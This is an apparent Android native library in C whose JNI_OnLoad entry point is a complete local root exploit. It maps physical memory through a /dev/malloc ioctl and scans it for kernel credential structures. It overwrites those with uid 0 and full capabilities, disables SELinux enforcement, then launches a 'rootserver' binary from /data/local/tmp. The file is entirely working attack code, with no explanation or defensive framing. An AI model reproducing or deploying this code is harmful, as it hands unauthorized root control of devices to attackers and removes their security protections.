typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long long u64;
#define SYS_open 5
#define SYS_close 6
#define SYS_write 4
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
#define SYS_getuid 199
#define SYS_geteuid 201
#define SYS_fork 2
#define SYS_execve 11
#define SYS_exit 1
#define SYS_wait4 114
static long sc(long n,long a,long b,long c,long d,long e,long f){
 register long r7 __asm__("r7")=n; register long r0 __asm__("r0")=a;
 register long r1 __asm__("r1")=b; register long r2 __asm__("r2")=c;
 register long r3 __asm__("r3")=d; register long r4 __asm__("r4")=e;
 register long r5 __asm__("r5")=f;
 __asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");
 return r0;
}
static int lf=-1;
static void w(int fd,const char*s){int n=0;while(s[n])n++;if(fd>=0)sc(SYS_write,fd,(long)s,n,0,0,0);}
static void hx(int fd,u64 v){char b[17];int i;for(i=15;i>=0;i--){int d=v&0xf;b[i]=d<10?'0'+d:'a'+d-10;v>>=4;}b[16]=0;w(fd,b);}
static void dc(int fd,long v){char b[32];int i=31;b[31]=0;if(v<0){w(fd,"-");v=-v;}if(!v){w(fd,"0");return;}while(v&&i){b[--i]='0'+v%10;v/=10;}w(fd,b+i);}
struct info { u64 addr; u64 size; u64 interval; u8 miusel; u8 pad[7]; };
static int pfd=-1;
static unsigned long mp(u64 bus,u64 size){
 struct info i;i.addr=bus-0x20000000ULL;i.size=size;i.interval=0;i.miusel=0;for(int k=0;k<7;k++)i.pad[k]=0;
 long r=sc(SYS_ioctl,pfd,0x80204d04,(long)&i,0,0,0);
 if(r<0)return 0;
 long p=sc(SYS_mmap2,0,size,3,1,pfd,0);
 if((unsigned long)p>=0xfffff000UL)return 0;
 return p;
}
static int start_server(void){
 int pid=sc(SYS_fork,0,0,0,0,0,0);
 if(pid==0){
  char *argv[2]; argv[0]=(char*)"/data/local/tmp/rootserver"; argv[1]=0;
  char *envp[3]; envp[0]=(char*)"PATH=/sbin:/system/sbin:/system/bin:/system/xbin";envp[1]=(char*)"HOME=/";envp[2]=0;
  long r=sc(SYS_execve,(long)argv[0],(long)argv,(long)envp,0,0,0);
  w(lf,"exec rootserver=");dc(lf,r);w(lf,"\n");sc(SYS_exit,1,0,0,0,0,0);
 }
 int st=0;sc(SYS_wait4,pid,(long)&st,0,0,0,0);
 w(lf,"server st=");dc(lf,st);w(lf,"\n");
 return pid;
}
static void try_selinux(void){
 int fd=sc(SYS_open,(long)"/sys/fs/selinux/enforce",1,0,0,0,0);
 w(lf,"selinux fd=");dc(lf,fd);w(lf,"\n");
 if(fd>=0){long r=sc(SYS_write,fd,(long)"0",1,0,0,0);w(lf,"selinux write=");dc(lf,r);w(lf,"\n");sc(SYS_close,fd,0,0,0,0,0);}
 int p=sc(SYS_fork,0,0,0,0,0,0);
 if(p==0){char *a[3];a[0]=(char*)"/system/bin/setenforce";a[1]=(char*)"0";a[2]=0;char *e[2];e[0]=(char*)"PATH=/system/bin";e[1]=0;long r=sc(SYS_execve,(long)a[0],(long)a,(long)e,0,0,0);w(lf,"exec setenforce=");dc(lf,r);w(lf,"\n");sc(SYS_exit,1,0,0,0,0,0);}
 int st=0;sc(SYS_wait4,p,(long)&st,0,0,0,0);
 w(lf,"setenforce st=");dc(lf,st);w(lf,"\n");
}
static int scan(u64 start,u64 end){
 int hits=0;
 for(u64 bus=start;bus<end;bus+=0x1000000ULL){
  unsigned long p=mp(bus,0x1000000);
  w(lf,"S ");hx(lf,bus);w(lf," p=");hx(lf,p);w(lf,"\n");
  if(!p)continue;
  u8*b=(u8*)p;
  for(u32 o=4;o<0x1000000-0x80;o+=4){
   u32*q=(u32*)(b+o);
   int ok=1;
   for(int k=0;k<8;k++) if(q[k]!=1000){ok=0;break;}
   if(!ok) continue;
   u8 save[0x80];for(int k=0;k<0x80;k++)save[k]=b[o+k];
   for(int k=0;k<8;k++)q[k]=0;
   q[8]=0; /* securebits at +0x20 */
   for(int k=9;k<19;k++)q[k]=0xffffffffu; /* caps +0x24..+0x48 */
   long uid=sc(SYS_getuid,0,0,0,0,0,0);
   w(lf,"H ");hx(lf,bus+o);w(lf," uid=");dc(lf,uid);w(lf,"\n");
   if(uid==0){
    w(lf,"ROOT cred=");hx(lf,bus+o);w(lf,"\n");
    w(lf,"euid=");dc(lf,sc(SYS_geteuid,0,0,0,0,0,0));w(lf,"\n");
    return 1;
   }
   for(int k=0;k<0x80;k++)b[o+k]=save[k];
   hits++;
  }
  sc(SYS_munmap,p,0x1000000,0,0,0,0);
  if(hits>5000)break;
 }
 w(lf,"HITS ");dc(lf,hits);w(lf,"\n");
 return 0;
}
__attribute__((visibility("default"))) int JNI_OnLoad(void*a,void*b){
 lf=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/credroot.log",0x241,0644,0,0,0);
 if(lf<0)return 0x10006;
 w(lf,"START uid=");dc(lf,sc(SYS_getuid,0,0,0,0,0,0));w(lf,"\n");
 pfd=sc(SYS_open,(long)"/dev/malloc",2,0,0,0,0);
 w(lf,"pfd=");dc(lf,pfd);w(lf,"\n");if(pfd<0)return 0x10006;
 if(!scan(0x60000000ULL,0x92000000ULL)) {
   if(!scan(0x20000000ULL,0x60000000ULL)) scan(0x92000000ULL,0xa0000000ULL);
 }
 w(lf,"FINAL uid=");dc(lf,sc(SYS_getuid,0,0,0,0,0,0));w(lf," euid=");dc(lf,sc(SYS_geteuid,0,0,0,0,0,0));w(lf,"\n");
 if(sc(SYS_getuid,0,0,0,0,0,0)==0){try_selinux();start_server();}
 w(lf,"DONE\n");sc(SYS_close,lf,0,0,0,0,0);
 return 0x10006;
}
